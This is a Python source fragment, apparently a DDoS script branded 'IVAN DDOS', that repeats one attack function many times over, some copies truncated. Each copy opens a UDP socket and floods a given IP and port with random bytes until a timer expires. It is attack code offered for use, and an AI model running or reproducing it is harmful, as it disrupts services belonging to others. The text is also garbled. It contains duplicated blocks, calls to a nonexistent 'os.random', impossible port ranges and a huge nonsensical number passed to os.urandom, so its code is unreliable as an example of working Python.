    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

